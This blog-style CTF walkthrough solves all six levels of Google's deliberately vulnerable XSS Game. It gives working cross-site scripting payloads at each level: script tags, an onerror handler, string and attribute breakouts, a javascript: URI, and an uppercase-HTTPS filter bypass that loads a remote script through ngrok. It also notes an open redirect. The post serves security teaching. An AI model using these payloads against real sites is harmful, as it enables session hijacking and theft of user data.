# 🎯 Google XSS CTF Walkthrough

**Lab Link:** [https://xss-game.appspot.com/](https://xss-game.appspot.com/) <br/>
**Platform:** Google XSS Game <br/>
**Vulnerability Class:** Cross-Site Scripting (XSS) <br/>

![Cover](Google_XSS_CTF/Cover.png)

---

## ✅ TL;DR

* XSS is **context-dependent**, not payload-dependent
* `innerHTML` and `jQuery.html()` are dangerous execution sinks
* Filters fail — logic flaws persist
* URL fragments and dynamic script loading are high-risk
* Real exploitation requires reading source, not guessing payloads

---

## 🔰 Introduction

Cross-Site Scripting (XSS) vulnerabilities remain one of the most commonly exploited weaknesses in modern web applications. Improper handling of user-controlled input allows attackers to execute arbitrary JavaScript in a victim’s browser, potentially leading to session hijacking, data theft, or account compromise.

The **Google XSS Game** is a deliberately vulnerable training platform designed to teach XSS exploitation from first principles. The lab progresses through six levels, each demonstrating a different real-world XSS pattern.

This article documents a **complete step-by-step Proof of Concept (PoC)** for all six levels, with screenshots mapped **exactly** to each step and payload reasoning explained throughout 🧪⚔️

---

## 🧪 Lab Description

> **Warning:** You are entering the XSS game area <br/>
> Welcome, recruit! <br/>

Cross-site scripting (XSS) bugs are among the most common and dangerous web vulnerabilities. These nasty buggers can allow attackers to steal or modify user data in applications.

Google treats XSS very seriously and has historically paid bounties of up to **$7,500** for dangerous XSS bugs.

There will be cake at the end 🍰

![1](Google_XSS_CTF/1.png)

---

## 🧩 Level 1 — Hello, World of XSS

**Link:** [https://xss-game.appspot.com/level1](https://xss-game.appspot.com/level1) <br/>
**Level:** 1/6 <br/>
**Vulnerability Type:** Reflected XSS <br/>

This level demonstrates reflected XSS where user input is directly embedded into the response without proper escaping.

![2](Google_XSS_CTF/2.png)

### 🔎 Reflection Check

Input:

```
Hii
```

Response:

```
Sorry, no results were found for Hii. Try again.
```

URL:

```
https://xss-game.appspot.com/level1/frame?query=Hii
```

The input is reflected unescaped — a clear reflected XSS indicator.

![3](Google_XSS_CTF/3.png)

### 🧪 HTML Injection Test

Payload:

```
<h1>Hiii</h1>
```

The HTML renders successfully, confirming lack of sanitization.

![4](Google_XSS_CTF/4.png)

### 💥 Final Payload (Level 1)

```
<script>alert("Aditya Bhatt")</script>
```

JavaScript executes successfully.

![5](Google_XSS_CTF/5.png)

---

## 🧩 Level 2 — Persistence is Key

**Link:** [https://xss-game.appspot.com/level2](https://xss-game.appspot.com/level2) <br/>
**Level:** 2/6 <br/>
**Vulnerability Type:** Stored XSS (Client-Side Storage) <br/>

![6](Google_XSS_CTF/6.png)

### 🧪 Initial Payload Attempts

Payloads tested:

```
test
```

```
<script>alert("Aditya Bhatt")</script>
```

* `test` message is posted
* `<script>` payload is completely redacted
* No observable changes in the Network tab

This suggests **tag-based filtering**, not contextual sanitization.

![7](Google_XSS_CTF/7.png)

### 🔎 JavaScript Source Code Review

Inspector → Debugger → Sources → `level2/frame`

```html
<!doctype html>
<html>
  <head>
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
    <script src="/static/post-store.js"></script>
  
    <script>
      var defaultMessage = "Welcome!<br><br>This is your <i>personal</i>"
        + " stream. You can post anything you want here, especially "
        + "<span style='color: #f00ba7'>madness</span>.";

      var DB = new PostDB(defaultMessage);

      function displayPosts() {
        var containerEl = document.getElementById("post-container");
        containerEl.innerHTML = "";
        var posts = DB.getPosts();
        for (var i=0; i<posts.length; i++) {
          var html = "<blockquote>" + posts[i].message + "</blockquote>";
          containerEl.innerHTML += html;
        }
      }
```

User-controlled input is rendered via `innerHTML`.
Script tags are filtered, but **event handlers are not** 🗿

![8](Google_XSS_CTF/8.png)

### 💥 Final Payload (Level 2)

```
<img src=x onerror=alert()>
```

The `onerror` handler executes — **Level 2 solved**.

---

## 🧩 Level 3 — That Sinking Feeling…

**Link:** [https://xss-game.appspot.com/level3](https://xss-game.appspot.com/level3) <br/>
**Level:** 3/6 <br/>
**Vulnerability Type:** DOM-Based XSS <br/>

![9](Google_XSS_CTF/9.png)

### 🔎 Parameter Analysis

URL fragment:

```
https://xss-game.appspot.com/level3/frame#1
```

Valid values: `1`, `2`, `3`
Any other input results in `Image NaN`.

![10](Google_XSS_CTF/10.png)

### 🔍 Source Code Review

```javascript
function chooseTab(num) {
  var html = "Image " + parseInt(num) + "<br>";
  html += "<img src='/static/level3/cloud" + num + ".jpg' />";
  $('#tabContent').html(html);
}
```

The `num` parameter is concatenated directly into HTML and rendered using `jQuery.html()` — a DOM XSS sink.

![11](Google_XSS_CTF/11.png)

### 🧪 Context Break

Payload:

```
'
```

Malformed output:

```
<img src="/static/cloud/level3/cloud" .jpg'="">
```

![12](Google_XSS_CTF/12.png)

### 💥 Final Payload (Level 3)

```
' onerror=alert() '
```

The malformed image triggers JavaScript execution.

![13](Google_XSS_CTF/13.png)

---

## 🧩 Level 4 — Context Matters

**Link:** [https://xss-game.appspot.com/level4](https://xss-game.appspot.com/level4) <br/>
**Level:** 4/6 <br/>
**Vulnerability Type:** JavaScript Context Injection <br/>

![14](Google_XSS_CTF/14.png)

### 🔎 Response Analysis (Burp)

```html
<img src="/static/loading.gif" onload="startTimer('test');" />
<div id="message">Your timer will execute in test seconds.</div>
```

User input is injected inside a **JavaScript string context**.

![15](Google_XSS_CTF/15.png)

### 🧪 Failed Payload

```
<script>alert(1)</script>
```

Escaped safely.

![16](Google_XSS_CTF/16.png)

### 💥 Final Payload (Level 4)

```
'); alert('1
```

Breaks out of the string and executes JavaScript.

![17](Google_XSS_CTF/17.png)

---

## 🧩 Level 5 — Breaking Protocol

**Link:** [https://xss-game.appspot.com/level5](https://xss-game.appspot.com/level5) <br/>
**Level:** 5/6 <br/>
**Vulnerability Type:** JavaScript URI Injection <br/>

![19](Google_XSS_CTF/19.png)

### 🔎 Signup Flow & Reflection

```
https://xss-game.appspot.com/level5/frame/signup?next=hii
```

Response:

```html
<a href="hii">Next >></a>
```

![20](Google_XSS_CTF/20.png)

### 🧪 Filter Bypass Attempt

```
hiii" attrib="Neww
```

Filtered, but reflection confirmed.

![21](Google_XSS_CTF/21.png)

### 💥 Final Payload (Level 5)

```
javascript:alert()
```

Executes on click.

![22](Google_XSS_CTF/22.png)

### 🔁 Extra Observation

Open redirect confirmed:

```
https://xss-game.appspot.com/level5/frame/signup?next=https://adityabhatt3010.netlify.app/
```

![23](Google_XSS_CTF/23.png)

![24](Google_XSS_CTF/24.png)

---

## 🧩 Level 6 — Follow the 🐇

**Link:** [https://xss-game.appspot.com/level6](https://xss-game.appspot.com/level6) <br/>
**Level:** 6/6 <br/>
**Vulnerability Type:** Dynamic Script Injection <br/>

![26](Google_XSS_CTF/26.png)

### 🔎 Source Code Review

```javascript
function includeGadget(url) {
  if (url.match(/^https?:\/\//)) return;
  var s = document.createElement('script');
  s.src = url;
  document.head.appendChild(s);
}
```

Anything after `#` is dynamically loaded.

![27](Google_XSS_CTF/27.png)

### 🧪 Hash Injection

```
#hii
```

Loads gadget.

![28](Google_XSS_CTF/28.png)

### 🧪 Malicious Script Setup

```
echo "alert()" > adi.js
python3 -m http.server 80
ngrok http 80
```

![29](Google_XSS_CTF/29.png)

### 💥 Final Payload (Level 6)

```
#HTTPS://a45cc0a21617.ngrok-free.app/adi.js
```

Uppercase `HTTPS` bypasses the filter.

![30](Google_XSS_CTF/30.png)

![31](Google_XSS_CTF/31.png)

---

## 🏁 Conclusion

The Google XSS Game mirrors real-world XSS mistakes still present in production systems. Each level reinforces a critical lesson: <br/>

> **Escaping input is meaningless without understanding execution context.** <br/>

If you can reason through these six levels, you’re already thinking like an attacker — and that’s exactly how strong defenders are built 🔐⚔️ <br/>

Happy hacking. <br/>

~ Aditya Bhatt <br/>

---

## ⭐ Follow Me & Connect

🔗 **GitHub:** [https://github.com/AdityaBhatt3010](https://github.com/AdityaBhatt3010) <br/>
💼 **LinkedIn:** [https://www.linkedin.com/in/adityabhatt3010/](https://www.linkedin.com/in/adityabhatt3010/) <br/>
✍️ **Medium:** [https://medium.com/@adityabhatt3010](https://medium.com/@adityabhatt3010) <br/>
👨‍💻 **PoC Repository:** [https://github.com/AdityaBhatt3010/Google-XSS-Game-Walkthrough/](https://github.com/AdityaBhatt3010/Google-XSS-Game-Walkthrough/) <br/>

---
